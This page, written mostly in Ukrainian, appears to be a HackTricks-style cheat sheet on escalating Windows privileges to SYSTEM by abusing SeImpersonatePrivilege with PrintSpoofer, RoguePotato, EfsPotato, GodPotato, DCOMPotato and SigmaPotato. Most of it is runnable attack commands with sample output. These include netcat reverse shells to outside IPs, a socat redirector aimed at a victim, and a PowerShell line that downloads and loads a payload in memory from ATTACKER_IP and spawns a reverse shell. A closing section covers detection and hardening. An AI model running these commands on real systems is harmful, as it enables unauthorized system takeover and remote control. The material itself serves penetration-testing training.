# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato не працює** на Windows Server 2019 та Windows 10 build 1809 і новіших версіях. Однак, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** можна використовувати для **отримання тих самих привілеїв та доступу рівня `NT AUTHORITY\SYSTEM`**. Ця [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) детально описує інструмент `PrintSpoofer`, який можна використовувати для зловживання привілеями impersonation на хостах Windows 10 та Server 2019, де JuicyPotato більше не працює.

> [!TIP]
> Сучасною альтернативою, яка часто підтримується в 2024–2025 роках, є SigmaPotato (форк GodPotato), що додає використання in-memory/.NET reflection та розширену підтримку ОС. Див. швидке використання нижче та репозиторій у References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

Усі наведені техніки базуються на зловживанні привілейованим сервісом, здатним до impersonation, з контексту, що має один із цих привілеїв:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Швидко перевірте привілеї:
```cmd
whoami /priv | findstr /i impersonate
```
Операційні нотатки:

- Якщо ваш shell працює під обмеженим токеном, який не містить SeImpersonatePrivilege (поширено для Local Service/Network Service в деяких контекстах), відновіть привілеї облікового запису за замовчуванням за допомогою FullPowers, а потім запустіть Potato. Приклад: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer потребує, щоб служба Print Spooler була запущена і доступна через локальний RPC-ендпоінт (spoolss). У загартованих середовищах, де Spooler відключили після PrintNightmare, віддавайте перевагу RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato вимагає OXID resolver, доступного на TCP/135. Якщо egress заблоковано, використовуйте redirector/port-forwarder (див. приклад нижче). У старіших збірках вимагався прапорець -f.
- EfsPotato/SharpEfsPotato зловживають MS-EFSR; якщо один pipe заблоковано, спробуйте альтернативні pipe (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай вказує на невідому/непідтримувану RPC службу автентифікації; спробуйте інший pipe/transport або переконайтесь, що цільова служба запущена.

## Швидка демонстрація

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Примітки:
- Ви можете використати -i, щоб створити інтерактивний процес у поточній консолі, або -c, щоб виконати однорядкову команду.
- Потребує службу Spooler. Якщо вона вимкнена — не спрацює.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Якщо вихідний порт 135 заблоковано, pivot OXID resolver через socat на вашому redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Порада: Якщо один pipe не спрацьовує або EDR блокує його, спробуйте інші підтримувані pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Примітки:
- Працює на Windows 8/8.1–11 та Server 2012–2022, якщо присутній SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato пропонує два варіанти, спрямовані на сервісні DCOM-об'єкти, які за замовчуванням мають RPC_C_IMP_LEVEL_IMPERSONATE. Скомпілюйте або використайте надані бінарні файли та запустіть вашу команду:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (оновлений форк GodPotato)

SigmaPotato додає сучасні зручності, такі як виконання в пам'яті через .NET reflection та PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Примітки щодо виявлення та посилення захисту

- Слідкуйте за процесами, які створюють named pipes і відразу викликають token-duplication APIs, а потім CreateProcessAsUser/CreateProcessWithTokenW. Sysmon може показувати корисну телеметрію: Event ID 1 (process creation), 17/18 (named pipe created/connected) та командні рядки, що створюють дочірні процеси під SYSTEM.
- Посилення захисту Spooler: відключення служби Print Spooler на серверах, де вона не потрібна, запобігає локальним примусам у стилі PrintSpoofer через spoolss.
- Посилення захисту облікових записів служб: мінімізуйте призначення SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege для користувацьких сервісів. Розгляньте запуск служб під віртуальними обліковими записами з мінімально необхідними привілеями та їх ізоляцію за допомогою service SID і write-restricted токенів, коли це можливо.
- Мережеві контролі: блокування вихідного TCP/135 або обмеження трафіку RPC endpoint mapper може зламати RoguePotato, якщо відсутній внутрішній редиректор.
- EDR/AV: всі ці інструменти широко розпізнаються за сигнатурами. Перекомпіляція з вихідників, перейменування символів/рядків або виконання в пам'яті можуть зменшити ймовірність виявлення, але не подолають надійну поведінкову детекцію.

## Посилання

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
